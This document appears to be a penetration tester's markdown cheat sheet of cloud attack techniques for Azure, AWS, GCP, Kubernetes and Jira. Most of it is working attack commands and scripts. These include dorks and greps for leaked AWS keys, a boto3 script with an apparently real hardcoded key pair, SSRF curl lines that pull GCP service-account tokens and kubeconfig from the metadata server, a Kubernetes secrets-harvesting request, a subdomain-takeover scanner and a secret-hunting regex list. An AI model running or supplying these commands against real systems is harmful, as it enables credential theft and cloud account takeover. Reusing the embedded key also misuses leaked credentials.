# Cloud TTPs

## Azure

Enumerate for Priv Esc:

```bash
# Login
$ az login -u <user> -p <password>

# Set Account Subscription
$ az account set --subscription "Pay-As-You-Go"

# Enumeration for Priv Esc
$ az ad user list -o table
$ az role assignment list -o table
```

## AWS

Shodan.io query to enumerate AWS Instance Metadata Service Access

```sh
/latest/meta-data/iam/security-credentials
```

Google Dorking for AWS Access Keys

```sh
inurl:pastebin "AWS_ACCESS_KEY"
```

Recursively searching for AWS Access Keys on *Nix containers

```bash
$ grep -ER "AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16}" /
```

S3 Log Google Dorking

```sh
s3 site:amazonaws.com filetype:log
```

Python code to check if AWS key has permissions to read s3 buckets:

```python
import boto3
import json

aws_access_key_id = 'AKIAQYLPMN5HIUI65MP3'
aws_secret_access_key = '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'
region = 'us-east-2'

session = boto3.Session(
    aws_access_key_id=aws_access_key_id,
    aws_secret_access_key=aws_secret_access_key,
    region_name=region
)

s3 = session.resource('s3')

try:
    response = []
    for bucket in s3.buckets.all():
        response.append(bucket.name)
    print(json.dumps(response))
except Exception as e:
    print(f"Error: {e}")
```

Find S3 Buckets Using Subfinder and HTTPX Tool

```sh
subfinder -d <TARGET_DOMAIN> -all -silent | httpx -silent -webserver -threads 100 | grep -i AmazonS3
```

### Cognito

> [!NOTE]
> Before proceeding, capture the session's JWT during login and save to a file (ex: `access_token.txt`)
> This can be accomplished using your browser developer tools or another method

1. Get user information:

```sh
aws cognito-idp get-user --access-token $(cat access_token.txt)
```

2. Test admin authentication:

```sh
aws cognito-idp admin-initiate-auth --access-token $(cat access_token)
```

3. List user groups:

```sh
aws cognito-idp admin-list-groups-for-user \
  --username user.name@email.com \
  --user-pool-id "Group-Name"
```

4. Attempt sign up

```sh
aws cognito-idp sign-up --client-id <client-id> --username <username> --password <password>
```

5. Modify attributes

```sh
aws cognito-idp update-user-attributes --access-token $(cat access_token) --user-attributes Name=<attribute>,Value=<value>
```

### AWS Trivy Scanning

1. Install the Trivy AWS plugin: `trivy plugin install github.com/aquasecurity/trivy-aws`

2. Scan a full AWS account (all supported services):

```sh
trivy aws --region us-east-1
```

3. Scan a specific service:

```sh
trivy aws --service s3
```

4. Show results for a specific AWS resource:

```sh
trivy aws --service s3 --arn arn:aws:s3:::example-bucket
```

### SSM

Script to quickly enumerate and select AWS SSM-managed EC2 instances via `fzf`, then start an SSM session without needing SSH or public access.

```sh
#!/bin/zsh

function main() {
  if ! command -v fzf >/dev/null || ! command -v aws >/dev/null; then
    echo "This function requires 'aws' CLI and 'fzf' to be installed." >&2
    return 1
  fi

  echo -e "Fetching SSM instances..."

  local instances
  instances=$(aws ssm describe-instance-information \
    --query "InstanceInformationList[*].[InstanceId,ComputerName]" \
    --output text)

  if [[ -z "$instances" ]]; then
    echo "No SSM-managed instances found." >&2
    return 1
  fi

  # Extract Instance IDs
  local ids=()
  while read -r id _; do
    ids+=("$id")
  done <<< "$instances"

  # Get Name tags for all instance IDs
  local name_data
  name_data=$(aws ec2 describe-instances \
    --instance-ids "${ids[@]}" \
    --query "Reservations[].Instances[].{InstanceId:InstanceId, Name:(Tags[?Key=='Name']|[0].Value)}" \
    --output text)

  declare -A name_map
  while read -r id name; do
    name_map["$id"]="${name:-N/A}"
  done <<< "$name_data"

  # Combine data with aligned formatting
  local enriched
  enriched=$(while read -r line; do
    id=$(awk '{print $1}' <<< "$line")
    hostname=$(awk '{print $2}' <<< "$line")
    platform=$(awk '{print $3}' <<< "$line")
    name="${name_map[$id]:-N/A}"
    printf "%-30s %-20s %-30s\n" "$name" "$id" "$hostname"
  done <<< "$instances")

  # Dynamically size the FZF selection window based on amount of instances
  local line_count
  line_count=$(echo "$enriched" | wc -l)

  local height
  if (( line_count < 10 )); then
    height=30
  elif (( line_count < 20 )); then
    height=50
  else
    height=80
  fi

  local selected instance_id
  selected=$(echo "$enriched" | fzf --header="Select an instance to connect via SSM" --height="${height}%" --reverse)
  instance_id=$(awk '{print $2}' <<< "$selected")

  if [[ -n "$instance_id" ]]; then
    echo "Starting SSM session to $instance_id..." >&2
    aws ssm start-session --target "$instance_id"
  else
    echo "No instance selected." >&2
    return 1
  fi
}

main
```

### API Gateway

AWS API Gateway is a service offered by Amazon Web Services (AWS) designed for developers to create, publish, and oversee APIs on a large scale. It functions as an entry point to an application, permitting developers to establish a framework of rules and procedures. This framework governs the access external users have to certain data or functionalities within the application.

Enumeration:

```sh
# Generic info
aws apigatewayv2 get-domain-names
aws apigatewayv2 get-domain-name --domain-name <name>
aws apigatewayv2 get-vpc-links

# Enumerate APIs
aws apigatewayv2 get-apis # This will also show the resource policy (if any)
aws apigatewayv2 get-api --api-id <id>

## Get all the info from an api at once
aws apigatewayv2 export-api --api-id <id> --output-type YAML --specification OAS30 /tmp/api.yaml

## Get stages
aws apigatewayv2 get-stages --api-id <id>

## Get routes
aws apigatewayv2 get-routes --api-id <id>
aws apigatewayv2 get-route --api-id <id> --route-id <route-id>

## Get deployments
aws apigatewayv2 get-deployments --api-id <id>
aws apigatewayv2 get-deployment --api-id <id> --deployment-id <dep-id>

## Get integrations
aws apigatewayv2 get-integrations --api-id <id>

## Get authorizers
aws apigatewayv2 get-authorizers --api-id <id>
aws apigatewayv2 get-authorizer --api-id <id> --authorizer-id <uth-id>

## Get domain mappings
aws apigatewayv2 get-api-mappings --api-id <id> --domain-name <dom-name>
aws apigatewayv2 get-api-mapping --api-id <id> --api-mapping-id <map-id> --domain-name <dom-name>

## Get models
aws apigatewayv2 get-models --api-id <id>

## Call API
https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<resource>
```

## GCP

Enumerate IP addresses:

```sh
#!/bin/bash

# Function to list all projects in the organization
list_all_projects() {
  gcloud projects list --format="value(projectId)"
}

# Function to check if a specific API is enabled for a project
is_api_enabled() {
  local project=$1
  local api=$2
  gcloud services list --project="$project" --filter="name:$api" --format="value(name)"
}

# Function to list all instances in a given project
list_instances() {
  local project=$1
  gcloud compute instances list --project="$project" --format="json"
}

# Main function
main() {
  # Create or clear the files to store public IPs
  output_file="public_ips.txt"
  ip_only_file="ip_addresses.txt"
  : > "$output_file"
  : > "$ip_only_file"
  
  # Get the list of all projects
  projects=$(list_all_projects)
  for project in $projects; do
    echo "Processing Project: $project"
    
    # Check if Resource Manager API is enabled for the project
    if [[ -z "$(is_api_enabled "$project" "cloudresourcemanager.googleapis.com")" ]]; then
      echo "Resource Manager API is not enabled for project $project. Skipping..."
      continue
    fi
    
    # Check if Compute Engine API is enabled for the project
    if [[ -z "$(is_api_enabled "$project" "compute.googleapis.com")" ]]; then
      echo "Compute Engine API is not enabled for project $project. Skipping..."
      continue
    fi

    # Get the list of all instances in the current project
    instances=$(list_instances "$project")

    # Check if there are any instances
    if [[ "$instances" != "[]" ]]; then
      # Loop through each instance and extract public IPs
      for instance in $(echo "$instances" | jq -r '.[] | @base64'); do
        _jq() {
          echo "$instance" | base64 --decode | jq -r "$1"
        }
        instance_name=$(_jq '.name')
        zone=$(_jq '.zone' | awk -F/ '{print $NF}')
        public_ips=$(_jq '.networkInterfaces[].accessConfigs[]?.natIP')
        
        # Check if there is a public IP and write to the output files
        if [[ -n "$public_ips" ]]; then
          for ip in $public_ips; do
            echo "$project,$zone,$instance_name,$ip" >> "$output_file"
            echo "$ip" >> "$ip_only_file"
          done
        fi
      done
    fi
  done

  echo "Public IPs have been written to $output_file"
  echo "IP addresses have been written to $ip_only_file"
}

# Execute main function
main
```

SSRF URL:

```sh
# /project
# Project name and number
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -s -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -s -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do 
    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
    echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do 
    echo "  Name: $sa"
    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
    echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```

## Cloud Subdomain Takeover

```python
import requests
from bs4 import BeautifulSoup
import dns.resolver
import argparse
from tqdm import tqdm

parser = argparse.ArgumentParser(
    description='Query crt.sh and perform a DNS lookup.')
parser.add_argument('domain', help='The domain to query.')
args = parser.parse_args()

response = requests.get(f"https://crt.sh/?q={args.domain}")
soup = BeautifulSoup(response.text, 'html.parser')
domain_names = [td.text for td in soup.find_all('td') if not td.attrs]

for domain in tqdm(domain_names, desc="Checking for subdomain takeovers"):
    # Skip invalid and wildcard domains
    if '*' in domain or len(domain) > 253 or any(len(label) > 63 for label in domain.split('.')):
        continue

    # Identify cloud services and check for potential subdomain takeovers
    try:
        answers = dns.resolver.resolve(domain, 'CNAME')
        for rdata in answers:
            cname = str(rdata.target)
            if '.amazonaws.com' in cname:
                response = requests.get(f"http://{domain}")
                if response.status_code in [403, 404]:
                    print(
                        f"Potential Amazon S3 bucket for subdomain takeover: {domain}")
            elif '.googleapis.com' in cname:
                response = requests.get(f"http://{domain}")
                if response.status_code in [403, 404]:
                    print(
                        f"Potential Google Cloud Storage bucket for subdomain takeover: {domain}")
            elif '.blob.core.windows.net' in cname:
                response = requests.get(f"http://{domain}")
                if response.status_code == 404:
                    print(
                        f"Potential Azure blob storage for subdomain takeover: {domain}")
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.YXDOMAIN, dns.resolver.NoNameservers):
        continue
```

## Kubernetes Secrets Harvesting

```bash
$ curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
```

## Kubernetes Service Enumeration

You can find everything exposed to the public with:

```sh
kubectl get namespace -o custom-columns='NAME:.metadata.name' | grep -v NAME | while IFS='' read -r ns; do
    echo "Namespace: $ns"
    kubectl get service -n "$ns"
    kubectl get ingress -n "$ns"
    echo "=============================================="
    echo ""
    echo ""
done | grep -v "ClusterIP"
```

## Kubernetes Ninja Commands

```bash
# List all pods in the current namespace.
kubectl get pods

# Get detailed information about a pod.
kubectl describe pod <pod-name>

# Create a new pod.
kubectl create pod <pod-name> 

# List all nodes in the cluster.
kubectl get nodes 

# Get detailed information about a node.
kubectl describe node <node-name> 

# Create a new node
kubectl create node <node-name> 

# List all services in the cluster.
kubectl get services 

# Get detailed information about a service.
kubectl describe service <service-name> 

# Create a new service.
kubectl create service <service-name> 

# List all secrets in the cluster.
kubectl get secrets 

# Get detailed information about a secret.
kubectl describe secret <secret-name> 

# Create a new secret.
kubectl create secret <secret-name> 
```

## Password Hunting Regex

```json
    "Slack Token": "(xox[pborsa]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})",
    "RSA private key": "-----BEGIN RSA PRIVATE KEY-----",
    "SSH (DSA) private key": "-----BEGIN DSA PRIVATE KEY-----",
    "SSH (EC) private key": "-----BEGIN EC PRIVATE KEY-----",
    "PGP private key block": "-----BEGIN PGP PRIVATE KEY BLOCK-----",
    "AWS API Key": "((?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16})",
    "Amazon MWS Auth Token": "amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
    "AWS API Key": "AKIA[0-9A-Z]{16}",
    "AWS AppSync GraphQL Key": "da2-[a-z0-9]{26}",
    "Facebook Access Token": "EAACEdEose0cBA[0-9A-Za-z]+",
    "Facebook OAuth": "[fF][aA][cC][eE][bB][oO][oO][kK].*['|\"][0-9a-f]{32}['|\"]",
    "GitHub": "[gG][iI][tT][hH][uU][bB].*['|\"][0-9a-zA-Z]{35,40}['|\"]",
    "Generic API Key": "[aA][pP][iI]_?[kK][eE][yY].*['|\"][0-9a-zA-Z]{32,45}['|\"]",
    "Generic Secret": "[sS][eE][cC][rR][eE][tT].*['|\"][0-9a-zA-Z]{32,45}['|\"]",
    "Google API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Cloud Platform API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Cloud Platform OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Google Drive API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Drive OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Google (GCP) Service-account": "\"type\": \"service_account\"",
    "Google Gmail API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google Gmail OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Google OAuth Access Token": "ya29\\.[0-9A-Za-z\\-_]+",
    "Google YouTube API Key": "AIza[0-9A-Za-z\\-_]{35}",
    "Google YouTube OAuth": "[0-9]+-[0-9A-Za-z_]{32}\\.apps\\.googleusercontent\\.com",
    "Heroku API Key": "[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}",
    "MailChimp API Key": "[0-9a-f]{32}-us[0-9]{1,2}",
    "Mailgun API Key": "key-[0-9a-zA-Z]{32}",
    "Password in URL": "[a-zA-Z]{3,10}://[^/\\s:@]{3,20}:[^/\\s:@]{3,20}@.{1,100}[\"'\\s]",
    "PayPal Braintree Access Token": "access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}",
    "Picatic API Key": "sk_live_[0-9a-z]{32}",
    "Slack Webhook": "https://hooks\\.slack\\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
    "Stripe API Key": "sk_live_[0-9a-zA-Z]{24}",
    "Stripe Restricted API Key": "rk_live_[0-9a-zA-Z]{24}",
    "Square Access Token": "sq0atp-[0-9A-Za-z\\-_]{22}",
    "Square OAuth Secret": "sq0csp-[0-9A-Za-z\\-_]{43}",
    "Telegram Bot API Key": "[0-9]+:AA[0-9A-Za-z\\-_]{33}",
    "Twilio API Key": "SK[0-9a-fA-F]{32}",
    "Twitter Access Token": "[tT][wW][iI][tT][tT][eE][rR].*[1-9][0-9]+-[0-9a-zA-Z]{40}",
    "Twitter OAuth": "[tT][wW][iI][tT][tT][eE][rR].*['|\"][0-9a-zA-Z]{35,44}['|\"]"
 ```

## Jira

### Privileges

In Jira, privileges can be checked by any user, authenticated or not, through the endpoints `/rest/api/2/mypermissions` or `/rest/api/3/mypermissions`. These endpoints reveal the user's current privileges.

```sh
# Check non-authenticated privileges
curl https://org.atlassian.net/rest/api/2/mypermissions | jq | grep -iB6 '"havePermission": true'
```
